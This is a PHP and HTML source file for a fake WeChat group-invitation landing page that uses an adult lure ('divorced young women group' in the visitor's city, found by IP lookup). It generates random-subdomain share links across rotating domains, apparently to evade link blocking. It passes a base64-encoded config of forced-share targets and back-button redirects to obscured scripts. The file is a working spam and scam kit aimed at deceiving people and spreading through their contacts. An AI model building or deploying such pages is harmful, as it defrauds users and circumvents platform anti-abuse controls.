<?php
include('include.php');
$time = time();
$key = "3542x5jj0n+beX3gewcfedIKORiCnxwKjR+rP0iiCRlF47XOg6x0Ru5V9JR98Ofh1RQzh96pHhDcH8eiY/XphOBNzgrkCi62Lzeyrf0VEC/hqo+x0uAeiQml/ekW3GriIKMeqNaPdrJjpoV2e77gDkvSWlhRPunxiHaSo6Pf4/Q6cfFGpXPHzTajd1j29ajonvq6QMukacZ66OBtn+bTDsmRsPMRxtjz9Hc";
$a = array($d3_domain, $d4_domain);
$random_keys = array_rand($a);
$host = $a[$random_keys];
$n = mt_rand(10, 100);
//example=>http://jsjs.incocos.com/s2edc82@3fc68f9-86c8efa)ca30af*5a,5dc34;8f9210080388e8b24e4d577acd234f25;19;78cb28ae8a7eaf1684941d49f43200afadvertmbqtihehacrgg
$share_link = "http://" . strtolower(get_rand_str(2, 6)) . "." . $host . "/m3" . strtolower(get_rand_str(5, 5)) . "@" . strtolower(get_rand_str(7, 7)) . "-m3096c8efa)erfeg45*067563," . strtolower(get_rand_str(5, 6)) . ";" . get_random_str(16) . "acd234f25;$n;" . get_random_str(32);

$hit = mt_rand(500, 1000);
$current_url = "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

$rts_name = array('淡紫', '宠儿', '如初', '青稚', '辞予', '心雨', '南浔', '空白', '夜莺', '林萌', '森蒂', '亦柔', '素七', '米豆', '瑶瑶', '菲菲');
$index = rand(0, count($rts_name) - 1);
$rtd_f = mt_rand(10, 50);

$config_array = array(
    "api" => "./fwServe.php?key=$key&url=$current_url&t=$time&hit=$hit",
    "content" => array(
        "title" => "{city}离异少妇群",
        "desc" => "“{$rts_name[$index]}”邀妳加入女神集聚，内有{$rtd_f}位好友，点击进入>>>",
        "qtitle" => "{city}红颜群",
        "ctext" => "{city}离异少妇群",
        "adv" => "https://juqiang.oss-cn-beijing.aliyuncs.com/new_video/lao.jpg",
        "img" => "http://wx3.sinaimg.cn/mw690/007bcsg1gy1fwh38pq2s2j30u00u07am.jpg",
        "type" => array("wxmsg", "wxmsg", "wxmsg", "wxmsg", "pyq", "pyq"),
        "a" => array(
            "{$share_link}/tyf1" . strtolower(get_rand_str(1, 5)),
            "{$share_link}/tyf2" . strtolower(get_rand_str(2, 5)),
            "{$share_link}/tyf3" . strtolower(get_rand_str(3, 5)),
            "{$share_link}/tyf4" . strtolower(get_rand_str(4, 5)),
            "{$share_link}/tyt5" . strtolower(get_rand_str(5, 5)),
            "{$share_link}/tyt6" . strtolower(get_rand_str(2, 6)),
        ),
    ),
    "f" => "http://www.youqingmulu.com/index/adv/Ainterfaces/dir/86g/index/nk4/z/html",
    "bul" => $back_url,
    "lastbul" => $back_url,
);
$jsonarr = json_encode($config_array);
$base64arr = base64_encode($jsonarr);
$shortstring = $base64arr . "&t=" . $time;
?>
<!doctype html>
<html lang="en" style="font-size: 53px; width: 400px;">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>{city}离异少妇群</title>
    <script src="/js/limit.js?v=1.2"></script>
</head>
<body style="height: 833px;">
<meta name="viewport"
      content="width=device-width, hright=device-height, target-densitydpi=device-dpi, initial-scale=1, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
<meta charset="UTF-8">
<title>邀您加入群聊</title>
<style type="text/css">
    html {
        font-size: 50px;
    }

    body, div, ul, li {
        padding: 0;
        margin: 0;
    }

    body {
        background: #F0EFF4;
    }

    .clearfix {
        display: block;
    }

    .clearfix:after {
        content: '';
        display: block;
        height: 0;
        clear: both;
        visibility: hidden;
    }

    .container {
        height: 100%;
        background: #F0EFF4;
        position: relative;
    }

    .wrapper {
        height: 100%;
        overflow-y: hidden;
        font-size: 0.3rem;
    }

    .box-top {
        height: 0.5rem;
    }

    .box-bottom {
        height: 1.5rem;
    }

    .content .box > div {
        display: none;
    }

    .content .one {
        background: #ccc;
        margin: auto;
        width: 1.5rem;
        color: #FFF;
        text-align: center;
        border-radius: 0.05rem;
    }

    .content .two {
        width: 89%;
        margin: auto;
        background: #CCC;
        border-radius: 0.05rem;
        padding: 0.15rem;
        margin-top: 0.5rem;
        color: #FFF;
        text-align: justify;
    }

    .content .two span {
        color: #6495ed;
    }

    .footerId {
        position: fixed;
        z-index: 2;
        bottom: 0;
        left: 0;
        width: 100%;
        height: 1rem;
        background: #FFFFFF;
        padding: 0;
        text-align: center;
        line-height: 1rem;
        font-size: 0.3rem;
    }

    .footerId .show-voice {
        background: url("http://i1.fuimg.com/671218/3297bf260679b26d.png") no-repeat;
        background-size: 100%;
        width: 0.6rem;
        height: 0.6rem;
        display: inline-block;
        position: absolute;
        top: 0;
        bottom: 0;
        margin: auto;
        left: 0.2rem;
    }

    .footerId .show-plus {
        background: url("http://i1.fuimg.com/671218/594fec48ef1bff58.png") no-repeat;
        background-size: 100%;
        width: 0.6rem;
        height: 0.6rem;
        display: inline-block;
        position: absolute;
        top: 0;
        bottom: 0;
        margin: auto;
        right: 0.2rem;
    }

    .footerId .show-input {
        display: inline-block;
        position: absolute;
        width: 4.88rem;
        border-bottom: 1px solid #ddd;
        bottom: 0.18rem;
        left: 0.9rem;
    }

    .footerId .show-smile {
        background: url("http://i1.fuimg.com/671218/5d7ede0e753bf759.png") no-repeat;
        background-size: 100%;
        width: 0.6rem;
        height: 0.6rem;
        display: inline-block;
        position: absolute;
        top: 0;
        bottom: 0;
        margin: auto;
        right: 1rem;
    }

    .footerId .footerCen {
        background: #444;
        width: 100%;
        opacity: 0.6;
        position: absolute;
        z-index: 111;
        height: 1.1rem;
        display: none;
    }

    .three {
        width: 93%;
        margin: auto;
        margin-top: 0.5rem;
    }

    .three .avatar1 {
        background: url("http://wx2.sinaimg.cn/mw690/8d9179f0gy1fxy2d6nxbjj20b40b4gm0.jpg") no-repeat;
    }

    .three .avatar2 {
        background: url("http://wx3.sinaimg.cn/mw690/007bcsg1gy1fy7drvlx1nj30b40b4q3u.jpg") no-repeat;
    }

    .three .avatar3 {
        background: url("http://wx4.sinaimg.cn/mw690/8d9179f0gy1fxy2d6xks5j20b40b4q38.jpg") no-repeat;
    }

    .three .avatar4 {
        background: url("http://wx2.sinaimg.cn/mw690/8d9179f0gy1fxy2dbk4hfj20b40b4gpg.jpg") no-repeat;
    }

    .three .avatar5 {
        background: url("http://wx2.sinaimg.cn/mw690/8d9179f0gy1fxy2d987z5j20b40b4t93.jpg") no-repeat;
    }

    .three .avatar6 {
        background: url("http://wx2.sinaimg.cn/small/8d9179f0gy1fxy2dc6ks5j208c08c0sr.jpg") no-repeat;
    }

    .three .box-left {
        float: left;
        width: 1rem;
        height: 1rem;
        background-size: cover;
    }

    .three .box-right {
        float: left;
        margin-left: 0.2rem;
        width: 5.2rem;
        text-align: justify;
    }

    .three .box-group1 {
        background: url('/img/007bcsg1gy1fy7duyiezuj30ao073gme.jpg') no-repeat;
        background-size: contain;
        width: 3.75rem;
        height: 2.49rem;
        margin-top: 0.2rem;
    }

    .three .box-group2 {
        background: url('/img/257ca8d4a4bcd3fc.png') no-repeat;
        background-size: contain;
        width: 4.2rem;
        height: 1.3rem;
        margin-top: 0.2rem;
        margin-left: -0.11rem;
    }

    .three .box-group3 {
        background: url('/img/addeff023434vg456.jpg') no-repeat;
        background-size: 100% 100%;
        width: 3.5rem;
        height: 3.98rem;
        margin-top: 0.2rem;
    }

    .three .box-group4 {
        background: url('/img/007bcsg1gy1fy55vg3e7pj305i0883yi.jpg') no-repeat;
        background-size: 100%;
        width: 3.5rem;
        height: 5.22rem;
        margin-top: 0.2rem;
    }

    .three .box-group5 {
        background: url('/img/45gbffbvfv9dfv90090ertyuuiijk87.jpg') no-repeat;
        background-size: 100% 100%;
        width: 3.5rem;
        height: 4.54rem;
        margin-top: 0.2rem;
    }

    .three .box-text {
        background: #FFF;
        padding: 0.15rem;
        color: #444;
        border-radius: 0.05rem;
        margin-top: 0.2rem;
    }

    .four {
        background: #ccc;
        margin: auto;
        width: 3.5rem;
        color: #FFF;
        text-align: center;
        border-radius: 0.05rem;
        margin-top: 0.5rem;
    }

    .four span {
        color: #6495ed;
    }

    .cen {
        position: fixed;
        width: 100%;
        height: 100%;
        background: url("http://i1.fuimg.com/671218/bce885c694822ac0.png") no-repeat top #666;
        top: 0;
        z-index: 2;
        opacity: 0.6;
        background-size: contain;
        background-position-y: 0.4rem;
        display: none;
    }

    .cen-content {
        position: fixed;
        z-index: 4;
        left: 0;
        right: 0;
        top: 0;
        bottom: 0;
        margin: auto;
        width: 5.8rem;
        text-align: center;
        background: #FFFFFF;
        height: 3.8rem;
        border-radius: 0.07rem;
        display: none;
    }

    .cen-content .alert-content {
        height: 3.1rem;
        width: 100%;
        font-size: 0.35rem !important;
        position: absolute;
        top: 0;
        text-align: center;
    }

    .c-red {
        color: red;
        font-style: normal;
    }

    .c-green {
        color: green;
    }

    .c-one {
        margin-top: 0.5rem;
    }

    .c-two {
        margin-top: 0.35rem;
        font-weight: bold;
    }

    .c-three {
        margin-top: 0.35rem;
        font-style: normal;
    }

    .c-four {
        margin-top: 0.2rem;
        font-weight: bold;
    }

    .c-five {
        font-weight: bold;
        margin-top: 0.6rem;
    }

    .c-six {
        margin-top: 0.2rem;
    }

    .c-seven {
        margin-top: 0.5rem;
    }

    .c-eight {
        margin-top: 0.25rem;
    }

    .cen-content .sure {
        padding: 0;
        margin: 0;
        font-size: 0.32rem;
        height: 0.7rem;
        position: absolute;
        width: 100%;
        line-height: 0.7rem;
        bottom: 0;
        border-top: 1px solid #CCC;
        color: #008000;
    }

    .img-box {
        width: 100%;
        height: 100%;
        position: absolute;
        top: 0;
        z-index: 3;
        background-size: cover;
        display: none;
    }
</style>
<div class="container" id="container"></div>
<script type="text/javascript" src="/js/sm.js" charset="utf-8"></script>
<script src="http://ip.ws.126.net/ipquery" charset="utf-8"></script>
<script type="text/javascript" src="http://code.jquery.com/jquery-1.9.1.min.js"></script>
<script src="http://res.wx.qq.com/open/js/jweixin-1.2.0.js" charset="utf-8"></script>
<script type="text/javascript" src="https://unpkg.com/better-scroll@1.13.2/dist/bscroll.min.js"></script>
<script>
    var _bul = "<?php echo $config_array['bul'];?>";
    var _lastbul = "<?php echo $config_array['lastbul'];?>";
</script>
<script type="text/javascript" src="/js/hs_qc_j.js?tr=<?php echo $shortstring; ?>"></script>
<div style="display: none">
    <script>
        var _hmt = _hmt || [];
        (function () {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?<?php echo $baidu_id;?>";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    </script>
</div>
</body>
</html>